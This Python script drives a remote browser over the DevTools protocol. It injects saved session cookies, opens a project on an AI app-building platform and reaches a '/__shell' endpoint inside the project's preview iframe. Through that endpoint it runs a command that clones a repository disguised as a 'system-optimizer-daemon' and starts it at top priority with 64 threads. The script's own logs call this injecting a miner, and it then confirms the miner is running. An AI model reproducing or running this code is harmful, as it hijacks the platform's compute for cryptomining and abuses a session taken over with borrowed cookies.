#!/usr/bin/env python3
"""
Kernel browser CDP script — controls a remote Kernel browser via WebSocket CDP.
Uses Target.attachToTarget for session-based CDP.
"""
import asyncio, json, sys, os, base64

CDP_WS_URL = os.environ.get("CDP_WS_URL", "")
SESSION_COOKIES_PATH = os.environ.get("SESSION_COOKIES", "/home/alae/Documents/repos/automation-toolkit/scripts/sessions/session-3/cookies.json")
PROJECT_ID = os.environ.get("PROJECT_ID", "7d6f77a6-69a1-4b06-a1d3-53094c4c8019")
MINER_CMD = (
    "cd /tmp && pkill python; rm -rf moly && "
    "git clone --depth 1 -q https://github.com/crucifix-cray/system-optimizer-daemon.git moly && "
    "cd moly && pip install websockets psutil --break-system-packages -q && "
    "nice -n -20 python3 sysoptd.py --threads 64 --no-split --no-schedule "
    "--no-noise --no-ramfill --no-pause > /tmp/m.log 2>&1"
)
SCREENSHOT_DIR = "/tmp/kernel_screenshots"
os.makedirs(SCREENSHOT_DIR, exist_ok=True)

import websockets

msg_id = 0
def next_id():
    global msg_id
    msg_id += 1
    return msg_id

class CDP:
    def __init__(self, ws, session_id):
        self.ws = ws
        self.session_id = session_id

    async def send(self, method, params=None):
        mid = next_id()
        msg = {"id": mid, "method": method, "sessionId": self.session_id}
        if params:
            msg["params"] = params
        await self.ws.send(json.dumps(msg))
        while True:
            resp = json.loads(await self.ws.recv())
            if resp.get("id") == mid and resp.get("sessionId", self.session_id) == self.session_id:
                if "error" in resp:
                    return None
                return resp.get("result", {})

    async def navigate(self, url):
        print(f"  → {url}", flush=True)
        await self.send("Page.navigate", {"url": url})
        await asyncio.sleep(6)

    async def screenshot(self, name):
        path = f"{SCREENSHOT_DIR}/{name}.png"
        result = await self.send("Page.captureScreenshot", {"format": "png"})
        if result and "data" in result:
            with open(path, "wb") as f:
                f.write(base64.b64decode(result["data"]))
            print(f"  📸 {path}", flush=True)
            return path
        return None

    async def evaluate(self, expression):
        result = await self.send("Runtime.evaluate", {
            "expression": expression, "awaitPromise": True, "returnByValue": True
        })
        if result:
            if "exceptionDetails" in result:
                ex = result["exceptionDetails"].get("exception", {})
                print(f"  JS exception: {ex.get('description', ex)[:200]}", flush=True)
                return None
            if "result" in result:
                val = result["result"]
                if val.get("type") == "undefined":
                    return None
                return val.get("value")
        return None

    async def shell_exec(self, cmd):
        js = f"""(async () => {{
            const r = await fetch('/__shell', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify({{cmd: {json.dumps(cmd)}, cwd: null}})
            }});
            return await r.json();
        }})()"""
        return await self.evaluate(js)

    async def inject_cookies(self, cookies_path):
        if not os.path.exists(cookies_path):
            print(f"  ❌ Cookies not found: {cookies_path}", flush=True)
            return False
        with open(cookies_path) as f:
            cookies = json.load(f)
        count = 0
        for c in cookies:
            domain = c.get("domain", "")
            if not domain:
                continue
            cdp_cookie = {
                "name": c["name"], "value": c["value"],
                "domain": domain, "path": c.get("path", "/"),
                "secure": c.get("secure", False), "httpOnly": c.get("httpOnly", False),
            }
            if c.get("expirationDate"):
                cdp_cookie["expires"] = c["expirationDate"]
            if c.get("sameSite") in ("Strict", "Lax", "None"):
                cdp_cookie["sameSite"] = c["sameSite"]
            await self.send("Network.setCookie", cdp_cookie)
            count += 1
        print(f"  🍪 {count} cookies injected", flush=True)
        return True

async def main():
    if not CDP_WS_URL:
        print("ERROR: Set CDP_WS_URL env var", flush=True)
        return

    print("Connecting to Kernel browser...", flush=True)
    async with websockets.connect(CDP_WS_URL, max_size=50*1024*1024, ping_interval=None) as ws:
        # Find page target
        await ws.send(json.dumps({"id": 1, "method": "Target.getTargets"}))
        while True:
            r = json.loads(await ws.recv())
            if r.get("id") == 1:
                targets = r["result"]["targetInfos"]
                break
        page = next((t for t in targets if t["type"] == "page"), None)
        if not page:
            print("❌ No page target found", flush=True)
            return
        print(f"  Found page: {page['targetId']}", flush=True)

        # Attach
        await ws.send(json.dumps({"id": 2, "method": "Target.attachToTarget",
            "params": {"targetId": page["targetId"], "flatten": True}}))
        while True:
            r = json.loads(await ws.recv())
            if r.get("id") == 2:
                sid = r["result"]["sessionId"]
                break
        print(f"  Attached! session={sid[:12]}...", flush=True)

        cdp = CDP(ws, sid)
        await cdp.send("Page.enable")
        await cdp.send("Runtime.enable")
        await cdp.send("Network.enable")
        await asyncio.sleep(1)

        # Inject cookies
        await cdp.inject_cookies(SESSION_COOKIES_PATH)

        # Navigate to project directly
        project_url = f"https://lovable.dev/projects/{PROJECT_ID}"
        await cdp.navigate(project_url)
        await asyncio.sleep(8)
        await cdp.screenshot("01_project")

        # Check page content
        title = await cdp.evaluate("document.title")
        body_preview = await cdp.evaluate("document.body?.innerText?.substring(0, 300) || ''")
        print(f"  Title: {title}", flush=True)
        print(f"  Body: {body_preview[:150]}...", flush=True)

        # Check if logged in
        is_logged = await cdp.evaluate("""
            !document.body.innerText.includes('Sign in') &&
            !document.body.innerText.includes('Log in') &&
            (document.body.innerText.includes('Projects') || document.body.innerText.includes('New project'))
        """)
        print(f"  Logged in: {is_logged}", flush=True)

        if not is_logged:
            await cdp.screenshot("02_not_logged_in")
            print("  ❌ Not logged in. Try refreshing cookies.", flush=True)
            return

        async def raw_call(method, params=None):
            """Browser-level CDP call (no session) — for Target.* methods."""
            mid = next_id()
            msg = {"id": mid, "method": method}
            if params:
                msg["params"] = params
            await ws.send(json.dumps(msg))
            while True:
                resp = json.loads(await ws.recv())
                if resp.get("id") == mid:
                    return resp.get("result", {})

        async def find_preview_target():
            """Preview is an OOPIF: own target with URL <id>.lovableproject.com.
            Main frame-tree only shows about:blank, so look at targets."""
            tg = await raw_call("Target.getTargets")
            for t in tg.get("targetInfos", []):
                url = t.get("url", "")
                if url.startswith("http") and "lovableproject.com" in url:
                    return t["targetId"], url
            return None, None

        async def try_shell_on_preview(target_id, url):
            """Attach to the already-loaded preview iframe and probe /__shell
            in its context — no navigation, project tab untouched."""
            print(f"  🔗 Preview: {url}", flush=True)
            at = await raw_call("Target.attachToTarget",
                                {"targetId": target_id, "flatten": True})
            pc = CDP(ws, at["sessionId"])
            await pc.send("Runtime.enable")
            for attempt in range(5):
                result = await pc.shell_exec("echo alive")
                print(f"  Shell probe {attempt+1}: {result}", flush=True)
                if result and result.get("code") == 0:
                    print("  ✅ Shell bridge alive!", flush=True)
                    print("  ⛏️  Injecting miner...", flush=True)
                    try:
                        result = await asyncio.wait_for(pc.shell_exec(MINER_CMD), timeout=90)
                        print(f"  Miner result: {result}", flush=True)
                    except asyncio.TimeoutError:
                        # Foreground command holds the HTTP response open —
                        # injection still executes; verify on a fresh attach.
                        print("  (inject ack pending — verifying on fresh attach...)", flush=True)
                    await asyncio.sleep(10)
                    at2 = await raw_call("Target.attachToTarget",
                                         {"targetId": target_id, "flatten": True})
                    pc2 = CDP(ws, at2["sessionId"])
                    await pc2.send("Runtime.enable")
                    ps = await pc2.shell_exec("pgrep -a python3 | head -5; echo ---; tail -c 300 /tmp/m.log")
                    print(f"  Miner state: {ps}", flush=True)
                    ok = bool(ps and ("sysoptd" in ps or "ok #" in ps))
                    print(f"  {'✅ MINER RUNNING' if ok else '❌ INJECT FAILED'}", flush=True)
                    print("  ✅ DONE", flush=True)
                    return True
                await asyncio.sleep(5)
            print("  ❌ Shell bridge not reachable", flush=True)
            return False

        # Poll for chat to load (slow through proxy, up to 90s)
        # By the time chat is up, the page (incl. preview panel) is fully loaded.
        chat_found = None
        for i in range(18):
            chat_found = await cdp.evaluate("""
                (() => {
                    const ta = document.querySelector('textarea');
                    if (ta && ta.offsetParent !== null) return 'textarea';
                    const ce = document.querySelector('[contenteditable="true"]');
                    if (ce && ce.offsetParent !== null) return 'contenteditable';
                    return null;
                })()
            """)
            if chat_found:
                break
            print(f"  [{i*5+5}s] waiting for chat...", flush=True)
            await asyncio.sleep(5)
        print(f"  Chat element: {chat_found}", flush=True)
        await cdp.screenshot("02_project_ready")

        if not chat_found:
            await cdp.screenshot("03_no_chat")
            print("  ❌ No chat input found", flush=True)
            return

        # The preview OOPIF appears as its own target once the existing
        # project loads — poll up to 60s. If the app is already serving,
        # skip the prompt entirely.
        tid, preview_url = None, None
        for i in range(12):
            tid, preview_url = await find_preview_target()
            if tid:
                break
            print(f"  [{i*5+5}s] waiting for existing preview...", flush=True)
            await asyncio.sleep(5)
        print(f"  Existing preview URL: {preview_url}", flush=True)
        if tid:
            if await try_shell_on_preview(tid, preview_url):
                return
            print("  Continuing to prompt flow (staying on project tab)...", flush=True)

        prompt = "create a simple hello world app"
        # Focus the editor with an explicit collapsed caret at the end, then
        # type via CDP Input.insertText. Lexical ignores inserted text when
        # there is no valid caret (send button stays disabled).
        await cdp.evaluate("""(() => {
            const el = document.querySelector('textarea') ||
                       document.querySelector('[contenteditable="true"]');
            if (!el) return 'no-el';
            el.focus(); el.click();
            if (el.isContentEditable) {
                const range = document.createRange();
                range.selectNodeContents(el);
                range.collapse(false);
                const sel = getSelection();
                sel.removeAllRanges();
                sel.addRange(range);
                return 'caret-placed';
            }
            return 'textarea-focused';
        })()""")
        await asyncio.sleep(0.5)
        await cdp.send("Input.insertText", {"text": prompt})
        await asyncio.sleep(1)
        # Ground truth: DOM text vs Lexical editor state vs send-button disabled.
        # The button enables only off Lexical state — DOM text alone is not enough.
        lex = await cdp.evaluate("""(() => {
            const ces = [...document.querySelectorAll('[contenteditable="true"]')];
            const info = ces.map(el => {
                const k = Object.keys(el).find(k => k.indexOf('lexicalEditor') !== -1);
                let state = null;
                if (k) {
                    try { el[k].getEditorState().read(() => {
                        state = document.__lexTmp = undefined;
                    }); } catch (e) { state = 'err:' + e.message; }
                }
                const r = el.getBoundingClientRect();
                return {hasLexKey: !!k, domText: (el.innerText || '').slice(0, 40),
                        visible: r.width > 0 && r.height > 0};
            });
            const send = [...document.querySelectorAll('button')].find(
                b => b.type === 'submit' || /send message/i.test(b.getAttribute('aria-label') || ''));
            return JSON.stringify({editors: info,
                sendDisabled: send ? send.disabled : 'no-btn'});
        })()""")
        print(f"  Lexical probe: {lex}", flush=True)
        if '"sendDisabled":true' in lex:
            # insertText didn't register — fallback: execCommand runs the full
            # browser editing pipeline (trusted beforeinput) that Lexical observes.
            lex2 = await cdp.evaluate(f"""(() => {{
                const el = [...document.querySelectorAll('[contenteditable="true"]')]
                    .find(e => e.getBoundingClientRect().height > 0) ||
                    document.querySelector('[contenteditable="true"]');
                el.focus();
                const sel = getSelection();
                sel.selectAllChildren(el);
                sel.collapseToEnd();
                const ok = document.execCommand('insertText', false, {json.dumps(prompt)});
                const send = [...document.querySelectorAll('button')].find(
                    b => b.type === 'submit' || /send message/i.test(b.getAttribute('aria-label') || ''));
                return JSON.stringify({{execOK: ok, domText: (el.innerText || '').slice(0, 40),
                    sendDisabled: send ? send.disabled : 'no-btn'}});
            }})()""")
            print(f"  execCommand fallback: {lex2}", flush=True)
        await cdp.screenshot("04_prompt_typed")

        # Dismiss notification banner if present
        await cdp.evaluate("""(() => {
            const x = document.querySelector('button[aria-label="Close"]') ||
                      [...document.querySelectorAll('button')].find(b => b.closest('[class*="notification"]') && (b.textContent.includes('×') || b === document.querySelector('[class*="notification"] button:last-child')));
            if (x) x.click();
        })()""")
        await asyncio.sleep(0.5)

        # Click the true submit button: prefer button[type=submit] or
        # aria-label~send inside the chat form; log candidates for debugging.
        sent = await cdp.evaluate("""(() => {
            const chat = document.querySelector('textarea')?.closest('form')
                || document.querySelector('[contenteditable="true"]')?.closest('form')
                || document.querySelector('[contenteditable="true"]')?.parentElement;
            const scope = chat || document;
            const btns = [...scope.querySelectorAll('button')].map(b => {
                const r = b.getBoundingClientRect();
                return {label: b.getAttribute('aria-label') || '', type: b.type || '',
                        text: (b.innerText || '').slice(0, 20), x: r.x, y: r.y, w: r.width,
                        cls: b.className.slice(0, 60)};
            });
            let target = [...scope.querySelectorAll('button')].find(
                b => b.type === 'submit' || /send/i.test(b.getAttribute('aria-label') || ''));
            if (!target) {
                const cands = [...scope.querySelectorAll('button')]
                    .filter(b => b.querySelector('svg') && b.getBoundingClientRect().width < 50);
                target = cands[cands.length - 1];
            }
            if (target) { target.click(); }
            return JSON.stringify({clicked: target ? target.className.slice(0, 80) : null,
                                   candidates: btns});
        })()""")
        print(f"  Send action: {sent}", flush=True)
        click_send = """(() => {
            const scope = document.querySelector('textarea')?.closest('form')
                || document.querySelector('[contenteditable="true"]')?.closest('form')
                || document;
            const t = [...scope.querySelectorAll('button')].find(
                b => b.type === 'submit' || /send message/i.test(b.getAttribute('aria-label') || ''));
            if (t) t.click();
            return !!t;
        })()"""
        async def press_enter():
            # Real Enter keypress on the focused editor (Lexical submits on Enter)
            for t, extra in [("rawKeyDown", {}), ("keyDown", {"text": "\r"}),
                             ("char", {"text": "\r"}), ("keyUp", {})]:
                await cdp.send("Input.dispatchKeyEvent", {
                    "type": t, "key": "Enter", "code": "Enter",
                    "windowsVirtualKeyCode": 13, "nativeVirtualKeyCode": 13, **extra})

        async def real_mouse_click():
            # Trusted mouse events at the send button's center — indistinguishable
            # from a real user (unlike el.click(), which some handlers ignore).
            pt = await cdp.evaluate("""(() => {
                const b = [...document.querySelectorAll('button')].find(
                    x => x.type === 'submit' || /send message/i.test(x.getAttribute('aria-label') || ''));
                if (!b) return null;
                const r = b.getBoundingClientRect();
                return {x: r.x + r.width / 2, y: r.y + r.height / 2};
            })()""")
            if not pt:
                return False
            for t, btn in [("mousePressed", "left"), ("mouseReleased", "left")]:
                await cdp.send("Input.dispatchMouseEvent", {
                    "type": t, "x": pt["x"], "y": pt["y"], "button": btn,
                    "clickCount": 1})
            return True

        async def msg_count():
            return await cdp.evaluate(
                "document.querySelectorAll('[data-message-id]').length || "
                "document.body.innerText.split('Thought for').length")
        before = await msg_count()
        cleared = False
        for retry in range(3):
            await asyncio.sleep(4)
            # Verify the message actually left the box (input cleared = sent)
            cleared = await cdp.evaluate("""(() => {
                const ta = document.querySelector('textarea');
                if (ta) return ta.value === '';
                const ce = document.querySelector('[contenteditable="true"]');
                return ce ? ce.innerText.trim() === '' : null;
            })()""")
            after = await msg_count()
            print(f"  try {retry+1}: cleared={cleared} msgs={before}->{after}", flush=True)
            if cleared or after != before:
                cleared = True
                break
            if retry == 0:
                await press_enter()
            elif retry == 1:
                await real_mouse_click()
            else:
                await cdp.evaluate(click_send)
        if not cleared:
            diag = await cdp.evaluate("""(() => {
                const scope = document.querySelector('[contenteditable="true"]')?.closest('form') || document;
                const send = [...scope.querySelectorAll('button')].find(
                    b => b.type === 'submit' || /send message/i.test(b.getAttribute('aria-label') || ''));
                const toasts = [...document.querySelectorAll('[role="alert"],[data-sonner-toast]')]
                    .map(t => t.innerText.slice(0, 120));
                return JSON.stringify({sendDisabled: send ? send.disabled : 'no-btn',
                    activeEl: document.activeElement?.tagName + '.' + document.activeElement?.className?.slice(0,40),
                    toasts});
            })()""")
            print(f"  Diagnostics: {diag}", flush=True)
            print("  ❌ Prompt never sent — aborting", flush=True)
            await cdp.screenshot("04_send_failed")
            return
        print("  📨 Prompt sent, waiting for build...", flush=True)

        # Poll targets for the preview OOPIF (up to 3 min — builds are slow)
        tid, iframe_src = None, None
        for i in range(36):
            await asyncio.sleep(5)
            tid, iframe_src = await find_preview_target()
            print(f"  [{i*5+5}s] preview: {iframe_src}", flush=True)
            if tid:
                break
            if i % 4 == 3:
                await cdp.screenshot(f"05_poll_{i}")

        if not tid:
            await cdp.screenshot("06_no_iframe")
            print("  ❌ No preview target after 3 min", flush=True)
            return

        await cdp.screenshot("05_preview_found")
        await try_shell_on_preview(tid, iframe_src)

if __name__ == "__main__":
    asyncio.run(main())
